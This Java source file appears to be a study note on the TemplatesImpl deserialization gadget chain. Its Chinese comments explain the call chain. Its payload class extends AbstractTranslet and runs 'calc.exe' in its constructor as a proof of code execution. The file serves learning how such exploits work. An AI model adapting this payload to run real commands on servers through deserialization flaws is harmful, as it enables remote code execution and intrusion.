package com.liam.vulnerability;
/*
    解析：
        建立TextPayload类，通过new TestPayload进行初始化，通过伪造XML文档转换行为，触发构造方法；
        构造方法为：恶意代码，执行exec方法

    问题：
    1、为什么要继承`AbstractTranslet`类
    `Java`的`ClassLoader`类提供了`defineClass()`方法，可以把字节数组转换成`Java`类的示例，但该方法是被`Protected`修饰的只能在`ClassLoader`类中访问，不能被其他包中的类访问
    D:\02_Liam\Java\JavaTools\jdk-8u401\jre\lib\rt.jar!\java\lang\ClassLoader.class\defineClass()

    ALT + 7 查看类中所有的方法列表

    利用链
    TemplatesImpl.newTransformer() -> TemplatesImpl.getTransletInstance() -> TemplatesImpl.defineTransletClasses() -> TransletClassLoader.defineClass()


 */

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class TextPayload extends AbstractTranslet {
    public TextPayload() throws IOException{
        Runtime.getRuntime().exec("calc.exe");
    }
    //transform 是实现 AbstractTranslet 的抽象方法；
    //SerializationHandler 是把XML文档转换为另一种格式
    //DTMAxisIterator 是为了对`XML`文档中的节点进行迭代。
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        TextPayload payload = new TextPayload();
    }
}
